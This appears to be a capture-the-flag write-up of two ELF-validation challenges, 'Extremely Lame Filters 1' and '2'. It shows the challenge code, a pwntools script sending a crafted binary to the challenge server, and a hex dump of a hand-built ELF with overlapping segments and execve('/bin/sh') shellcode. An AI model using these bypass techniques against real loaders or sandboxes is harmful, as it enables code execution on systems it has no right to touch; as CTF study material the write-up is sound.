
1. Extremely Lame Filters 1
2. Extremely Lame Filters 2
3. squ1rrel-logon

If you want to get binary or bytes of ELF probs, DM me(Discord : guardianch)

--- 
# Extremely Lame Filters 1

`elf.py` analyze input ELF file.

```python
#!/usr/bin/python3

from elf import *
from base64 import b64decode

data = b64decode(input("I'm a little fairy and I will trust any ELF that comes by!!"))
elf = parse(data)

for section in elf.sections:
    if section.sh_flags & SectionFlags.EXECINSTR:
        raise ValidationException("!!")

elf.run()
```

`fairy.py` check sections flag of input file. If there is EXECINSTR flag in `sh_flags`, program turns off. However, `sh_flags` doesn't affect execution of the program, so just remove every EXECINSTR flag. funny trick lol. If section's flag is `06`, change it to `02`. After manipulating, send it to server.

# exploit

```python
from pwn import *
import base64

p = remote('20.84.72.194', '5002')
#p = process(['python3', 'fairy.py'])

dt = base64.b64encode(open('./ex_nofilter', 'rb').read())
p.sendlineafter(b'!!', dt)
p.interactive()
```

---
# Extremely Lame Filters 2

`elf.py` is same as last prob.

```python
#!/usr/bin/python3

from elf import *
from base64 import b64decode

data = b64decode(input("I'm a little fairy and I will trust any ELF that comes by!! (almost any)"))
elf = parse(data)

if elf.header.e_type != constants.ET_EXEC:
    print("!!")
    exit(1)

for segment in elf.segments:
    if segment.p_flags & SegmentFlags.X:
        content = elf.content(segment)
        for byte in content:
            if byte != 0:
                print(">:(")
                exit(1)

elf.run()
```

`e_type` should be `ET_EXEC`. It means elf must not have any linking. It is resolved by write shellcode and compile it. Second, it check segment's `p_flags`. `p_flags` affect program execution, so we can't use method used to solve `Extremely Lame Filters 1`. We need to know new trick haha.
First, load the bytes with RW permission, and load same position with RWX permission, but very small length. In this case, because the program data is allocated in units of one page, the permission of that page changes to RWX. However, it check only a little bytes. It's easy to say, but there's actually more to care about.

```
00000000: 7f45 4c46 0201 0103 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 e800 0100 0000 0000  ..>.............
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 4000 3800 0400 4000 0000 0000  ....@.8...@.....
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0100 0000 0600 0000 0800 0000 0000 0000  ................
00000080: 0800 0100 0000 0000 0800 0100 0000 0000  ................
00000090: f500 0000 0000 0000 f500 0000 0000 0000  ................
000000a0: 0000 0000 0000 0000 0100 0000 0700 0000  ................
000000b0: 0800 0000 0000 0000 0800 0100 0000 0000  ................
000000c0: 0800 0100 0000 0000 0800 0000 0000 0000  ................
000000d0: 0800 0000 0000 0000 0002 0000 0000 0000  ................
000000e0: 2f62 696e 2f73 6800 bf01 0102 0181 f7e1  /bin/sh.........
000000f0: 0103 0131 d231 f66a 3b58 0f05            ...1.1.j;X..
```

```
Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  <unknown>: 464 0x0000000000000000 0x00000001003e0002 0x00000000000100e8
                 0x0000000000000000 0x0000000000000000   W     0x38004000000000
  <unknown>: 400 0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000         0x0
  LOAD           0x0000000000000008 0x0000000000010008 0x0000000000010008
                 0x00000000000000f5 0x00000000000000f5  RW     0x0
  LOAD           0x0000000000000008 0x0000000000010008 0x0000000000010008
                 0x0000000000000008 0x0000000000000008  RWE    0x200
```

This is my binary. I set `Number of program headers` to 4, and `Start of program headers` to 0. Therefore program headers 1, 2 is abnormal. program header 3 load bytes 0x8 to 
`/bin/sh\x00` located in 0xe0, and my shellcode located in 0xe8.